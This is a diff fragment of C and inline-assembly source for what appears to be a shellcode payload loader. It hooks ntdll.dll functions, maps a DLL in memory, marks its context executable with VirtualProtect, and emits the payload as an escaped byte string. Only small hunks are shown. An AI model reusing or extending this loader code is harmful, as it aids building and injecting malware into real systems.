@@ -221,7 +221,9 @@ int __declspec(naked) ctx_data() {
  * find_ctx is used for finding the shellcode context in memory. It is 
  * mandatory step because the hook functions have no glue about the context 
  * (they are called from ntdll.dll)
- *
+ *		lea  eax, dword ptr find_ctx	; Calculate relative offset
+		lea  edx, dword ptr ctx_data
+		sub  eax, edx
  */
 int __declspec(naked) find_ctx() {
 	__asm {
@@ -240,7 +242,6 @@ int __declspec(naked) find_ctx() {
 		ret
 	}
 }
-
 
 /*
  * Find library name from given unicode string
@@ -637,9 +638,18 @@ void map_file(SHELLCODE_CTX *ctx) {
  */
 
 int loader2_main(SHELLCODE_CTX *ctx) {
-	DWORD		length, base, function;
+	SHELLCODE_CTX *saveCtx;
+	DWORD		length, base, function, old;
 	char		name[12];
 	int		i, bytes, read, left;
+
+	// Our context needs to be executable since we store original functions preambles
+	// inline (which are executed).
+	ctx->VirtualProtect(
+		ctx,
+		sizeof(SHELLCODE_CTX),
+		PAGE_EXECUTE_READWRITE,
+		&old);
 
 	/* dll entry point */
 	name[0] = 'I';
@@ -767,7 +777,7 @@ int main(int argc, char **argv) {
 		printf("\\x%02x", start2[i] & 0xff);
 
 		if (i > 0 && i % 20 == 0)
-			printf("\" .\n\"");
+			printf("\" +\n\"");
 	}
 	printf("\"\n");
 
